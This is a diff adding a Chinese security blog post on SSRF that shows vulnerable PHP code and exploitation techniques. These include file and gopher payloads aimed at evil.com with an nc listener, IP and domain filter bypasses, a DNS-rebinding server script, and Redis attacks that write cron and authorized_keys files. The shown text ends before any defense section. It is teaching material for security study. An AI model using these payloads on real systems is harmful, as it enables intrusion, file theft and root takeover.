@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="SSRF成因SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：123456789101112131415&amp;lt;?PHP    $url = $_GET[&apos;url&apos;];    $ch = CURL_INIT();    CURL_SETOPT($ch, CURLOPT_URL, $url);    CURL_SETOPT($ch,">
+<meta name="keywords" content="PHP,SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF成因、利用和防御">
+<meta property="og:url" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="SSRF成因SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：123456789101112131415&amp;lt;?PHP    $url = $_GET[&apos;url&apos;];    $ch = CURL_INIT();    CURL_SETOPT($ch, CURLOPT_URL, $url);    CURL_SETOPT($ch,">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549351620627.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549437045205.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549441559220.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549355712656.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549458278181.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549458694665.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549509311002.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549509436064.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549459966337.png">
+<meta property="og:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549459989638.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:29.222Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF成因、利用和防御">
+<meta name="twitter:description" content="SSRF成因SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：123456789101112131415&amp;lt;?PHP    $url = $_GET[&apos;url&apos;];    $ch = CURL_INIT();    CURL_SETOPT($ch, CURLOPT_URL, $url);    CURL_SETOPT($ch,">
+<meta name="twitter:image" content="http://anemone.top/ssrf-SSRF成因、攻击和防御/1549351620627.png">
+  <link rel="canonical" href="http://anemone.top/ssrf-SSRF成因、攻击和防御/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>SSRF成因、利用和防御 | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/ssrf-SSRF成因、攻击和防御/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">SSRF成因、利用和防御
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-05 15:09:20" itemprop="dateCreated datePublished" datetime="2019-02-05T15:09:20+08:00">2019-02-05</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:29" itemprop="dateModified" datetime="2021-04-26T21:55:29+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全-SSRF/" itemprop="url" rel="index"><span itemprop="name">Web安全-SSRF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/ssrf-SSRF成因、攻击和防御/" class="post-meta-item leancloud_visitors" data-flag-title="SSRF成因、利用和防御" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SSRF成因"><a href="#SSRF成因" class="headerlink" title="SSRF成因"></a>SSRF成因</h1><p>SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="comment">// 允许302跳转</span></span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">TRUE</span>);</span><br><span class="line">    $res = CURL_EXEC($ch);</span><br><span class="line">    <span class="comment">// 设置CONTENT-TYPE</span></span><br><span class="line">    CURL_CLOSE($ch) ;</span><br><span class="line">    <span class="comment">//返回响应</span></span><br><span class="line">    <span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+<p>就如上文所说，通过控制url参数可以使服务器可访问人任意网站，如<a href="http://localhost/ssrf.php?url=http://www.baidu.com：" target="_blank" rel="noopener">http://localhost/ssrf.php?url=http://www.baidu.com：</a></p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549351620627.png" alt="1549351620627"></p>
+<p>由于是服务端产生的跳转，因此用户这里看不到访问百度的请求，也因此攻击者可以利用其探索内网资源。</p>
+<p>参考猪猪侠的PPT，容易发生SSRF漏洞的地方有：</p>
+<ul>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
+<li>Webmail收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffpmg、ImageMagic、DOCX、PDF、XML处理器）<ul>
+<li>FFmpeg: concat： <a href="http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd" target="_blank" rel="noopener">http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd</a></li>
+<li>ImageMagick: fill ‘url(<a href="http://ssrf.wuyun.org" target="_blank" rel="noopener">http://ssrf.wuyun.org</a>)’</li>
+<li>SVG, JPG, XML, Json</li>
+</ul>
+</li>
+</ul>
+<p>容易发生SSRF漏洞的服务有：</p>
+<ol>
+<li>图片加载与下载：通过URL地址加载或下载图片</li>
+<li>Webhooks</li>
+<li>通过URL地址分享网页内容</li>
+<li>转码服务</li>
+<li>在线翻译</li>
+<li>图片、文章收藏功能</li>
+<li>未公开的api实现以及其他调用URL的功能</li>
+<li>从URL关键字中寻找</li>
+</ol>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>总的来说，一个网站存在SSRF则会有如下利用点</p>
+<ul>
+<li><p>服务探测</p>
+<p>关键在于对通过<strong>报错信息、响应时间</strong>判断是否服务是否存在</p>
+</li>
+<li><p>文件读取</p>
+<p>主要使用file协议对文件进行读取操作</p>
+</li>
+<li><p>对内网服务进行攻击（如redis写文件）</p>
+</li>
+<li><p>使用FastCGI进行远程命令执行</p>
+</li>
+<li><p>SSRF转反射式XSS</p>
+<p>如：<code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></p>
+</li>
+<li><p>在PDF中嵌入脚本</p>
+<p>使用<a href="https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：" target="_blank" rel="noopener">https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">”file:///etc/passwd”</span> <span class="attr">width</span>=<span class="string">”400</span>" <span class="attr">height</span>=<span class="string">”400</span>"&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span> -- to know the path and some times to know what os they are using at backend</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h2><p>支持的协议远不止这些，仅列出常用的：</p>
+<ul>
+<li><p>file://</p>
+<p>用于读取本地文件，如：<code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p>
+</li>
+<li><p>http:// &amp; https://</p>
+<p>用于访问内网http服务</p>
+</li>
+<li><p>ftp://</p>
+<p>访问FTP服务</p>
+</li>
+<li><p>dict://xxx/info</p>
+<p>可以泄露软件版本，或是操作内网redis服务等</p>
+</li>
+<li><p>gopher://</p>
+<p>java支持，php需要开启Gopher wrapper，%0a用于换行，具体用法如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php</span><br><span class="line">&lt;?php</span><br><span class="line">        header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)</span><br><span class="line">HI</span><br><span class="line">Multiline</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><h2 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h2><h3 id="十六进制IP"><a href="#十六进制IP" class="headerlink" title="十六进制IP"></a>十六进制IP</h3><p>如：0xA000001=10.0.0.1</p>
+<h3 id="十进制IP"><a href="#十进制IP" class="headerlink" title="十进制IP"></a>十进制IP</h3><p>如：167772161=10.0.0.1</p>
+<h3 id="八进制IP"><a href="#八进制IP" class="headerlink" title="八进制IP"></a>八进制IP</h3><p>如 012.0.0.1=10.0.0.1</p>
+<h2 id="绕过Domain限制"><a href="#绕过Domain限制" class="headerlink" title="绕过Domain限制"></a>绕过Domain限制</h2><h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a></h3><ul>
+<li>如：<a href="http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）" target="_blank" rel="noopener">http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）</a></li>
+</ul>
+<h3 id="nip-io"><a href="#nip-io" class="headerlink" title="nip.io"></a><a href="http://nip.io/" target="_blank" rel="noopener">nip.io</a></h3><h3 id="特殊字母"><a href="#特殊字母" class="headerlink" title="特殊字母"></a>特殊字母</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br><span class="line"></span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
+<h3 id="HTTP-基础认证"><a href="#HTTP-基础认证" class="headerlink" title="HTTP 基础认证"></a>HTTP 基础认证</h3><p>如：<a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a></p>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>基本原理是自建DNS服务器，使第一次解析为外网ip，第二次解析为内网ip</p>
+<p>在自己域名上绑定A记录和NS记录：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549437045205.png" alt="1549437045205"></p>
+<p>A记录指将ns1.anemone.top解析到118.x.x.184</p>
+<p>NS记录指子域名test.anemone.top由ns1.anemone.top来解析</p>
+<p>同时在一个dns服务（这里我在腾讯云上没试验成功，猜测是腾讯云屏蔽了udp端口的入向）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @file dns_server.py</span></span><br><span class="line"><span class="comment"># @brief dns_server</span></span><br><span class="line"><span class="comment"># @author Anemone95,x565178035@126.com</span></span><br><span class="line"><span class="comment"># @version 1.0</span></span><br><span class="line"><span class="comment"># @date 2019-02-06 14:58</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(name+<span class="string">" ===&gt; "</span>+ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+<p>结果（只能模拟一下效果）：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549441559220.png" alt="1549441559220"></p>
+<h2 id="绕过协议限制"><a href="#绕过协议限制" class="headerlink" title="绕过协议限制"></a>绕过协议限制</h2><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>攻击者建立<a href="http://127.0.0.1:8888/302.php：" target="_blank" rel="noopener">http://127.0.0.1:8888/302.php：</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:  dict://127.0.0.1:6379/set:1:helo"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>接着访问靶机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://127.0.0.1:8888/302.php</span><br></pre></td></tr></table></figure>
+<p>可以看到脆弱服务器6379端口收到了请求，协议被绕过：</p>
+<p><img src="/ssrf-SSRF成因、攻击和防御/1549355712656.png" alt="1549355712656"></p>
+<h3 id="使用-0d-0a-r-n"><a href="#使用-0d-0a-r-n" class="headerlink" title="使用%0d%0a(\r\n)"></a>使用%0d%0a(\r\n)</h3><p>之所以要使用其他协议是因为http的get请求没有换行，那么在url中加上<code>%0d%0a</code>就有可能模拟一个换行操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">operator=http://wuyun.org:6379/helo</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">config set dir /etc/cron.d/</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">quit%0d%0a(\r\n)</span><br></pre></td></tr></table></figure>
+<h2 id="Gopher利用Redis示例"><a href="#Gopher利用Redis示例" class="headerlink" title="Gopher利用Redis示例"></a>Gopher利用Redis示例</h2><p>gopher://协议可以模拟出tcp client的效果，因此可以模拟redis-cli，若服务器redis存在漏洞的话，就可以通过该方法提权。</p>
+<p>准备一个普通redis攻击时用的脚本，注意192.168.99.100和6379需要替换成自己的redis IP和端口（不是攻击者的）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">cat ~/upload.txt | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x get tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x quit</span><br></pre></td></tr></table></figure>
